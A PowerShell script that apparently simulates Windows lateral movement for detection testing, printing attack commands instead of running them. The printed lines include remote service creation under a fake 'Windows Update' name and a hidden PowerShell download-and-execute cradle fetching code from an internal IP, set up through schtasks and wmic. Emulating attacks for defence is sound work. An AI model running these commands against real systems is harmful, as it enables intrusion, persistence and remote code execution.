# Lateral Movement Simulation via PsExec-like behavior
# Simulates service creation for lateral movement

param(
    [string]$TargetHost = "localhost"
)

Write-Host "[*] Simulating lateral movement via service creation..." -ForegroundColor Yellow

# Simulate copying executable to ADMIN$
Write-Host "[+] Simulating file copy to ADMIN$..." -ForegroundColor Cyan
Write-Host "  [+] copy beacon.exe \\$TargetHost\ADMIN$\Temp\"

# Simulate creating a remote service
Write-Host "[+] Simulating remote service creation..." -ForegroundColor Cyan
$serviceName = "WindowsUpdateService"
$serviceDisplay = "Windows Update Service"
$binaryPath = "C:\Windows\Temp\beacon.exe"

Write-Host "  [+] sc \\$TargetHost create $serviceName binPath= $binaryPath"
Write-Host "  [+] sc \\$TargetHost start $serviceName"

# Schedule task sim
Write-Host "[+] Simulating scheduled task creation..." -ForegroundColor Cyan
$taskCmd = "powershell.exe -WindowStyle Hidden -NoLogo -NonInteractive -ep bypass -nop -c `"IEX((new-object net.webclient).downloadstring('http://192.168.56.101/a'))`""
Write-Host "  [+] schtasks /create /tn `"WindowsUpdateTask`" /tr `"$taskCmd`" /sc minute /mo 5"

# WMI persistence sim
Write-Host "[+] Simulating WMI persistence..." -ForegroundColor Cyan
Write-Host "  [+] wmic /node:$TargetHost process call create `"$taskCmd`""

Write-Host "[*] Lateral movement simulation complete." -ForegroundColor Green
Write-Host "[*] Note: These are simulated actions. In a real attack, tools like PsExec, WMI, or WinRM would be used."
